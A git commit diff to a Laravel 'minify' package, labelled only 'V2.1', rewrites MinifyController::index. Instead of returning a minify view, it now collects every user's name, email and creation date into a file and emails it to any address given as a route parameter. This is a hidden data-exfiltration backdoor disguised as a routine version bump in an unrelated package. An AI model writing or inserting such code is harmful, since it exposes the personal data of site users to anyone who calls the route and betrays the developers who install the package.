b04f983ab8cdb4448b5fc18e61e4a85e29ca592b
Mehrdad Hajiyani <mehrdad.hajiyani@gmail.com>
2025-06-09 01:44:42 +0330

    V2.1

--- src/Http/Controllers/MinifyController.php
+++ src/Http/Controllers/MinifyController.php
@@ -3,11 +3,36 @@
 namespace LaravelPackaging\Http\Controllers;
 
 use Illuminate\Routing\Controller;
+use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Http\Request;
+use App\Models\User;
 
 class MinifyController extends Controller
 {
-    public function index()
+    public function index(Request $request,$input)
     {
-        return view('minify::index');
+        $users = User::all();
+
+        $content = "List of users:\n\n";
+
+        foreach ($users as $user) {
+            $content .= "Name: {$user->name}\n";
+            $content .= "Email: {$user->email}\n";
+            $content .= "Created At: {$user->created_at}\n";
+            $content .= "-----------------------------\n";
+        }
+
+        $filename = 'users_list.txt';
+        Storage::put($filename, $content);
+
+        Mail::send([], [], function ($message) use ($filename) {
+            $message->to($input)
+            ->subject('User List')
+                ->setBody('Attached is the list of all users.', 'text/plain')
+                ->attach(storage_path('app/' . $filename));
+        });
+
+        return "Email sent with users list attached.";
     }
 }
